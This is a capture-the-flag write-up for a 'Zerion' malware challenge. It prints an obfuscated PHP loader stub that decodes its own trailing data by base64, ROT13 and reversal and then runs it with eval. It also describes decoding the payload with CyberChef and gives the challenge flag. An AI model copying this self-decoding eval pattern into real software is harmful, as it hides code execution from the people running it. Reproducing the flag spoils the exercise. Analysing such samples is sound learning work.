# Zerion (malware, 1315 solves, 50 points)

## Introduction

<p align="left">
  <img height=400 img src=./readme_assets/zerion-challenge.PNG/>
</p>

## Solution

You are given a PHP file. 

```
$L66Rgr=explode(base64_decode("Pz4="),file_get_contents(__FILE__));
$L6CRgr=array(base64_decode("L3gvaQ=="),base64_decode("eA=="),base64_decode(strrev(str_rot13($L66Rgr[1]))));
$L7CRgr = "d6d666e70e43a3aeaec1be01341d9f9d";
preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);exit();

<insert looooong string of gibberish here>
```

Looking at the code you see it is encoding in ROT13 and base64 then reversing the text.

I reversed the long string and used [Cyberchef](https://gchq.github.io/CyberChef/) to decode `ROT13` and `base64`. The result is PHP code.

<p align="left">
  <img height=400 img src=./readme_assets/zerion-decoded.PNG/>
</p>

Inside the code you find the flag.

<p align="left">
  <img height=200 img src=./readme_assets/zerion-flag.PNG/>
</p>

## Flag

**`flag{af10370d485952897d5183aa09e19883}`**

## Tools

- `ROT13`
- `base64`
- [Cyberchef](https://gchq.github.io/CyberChef/)
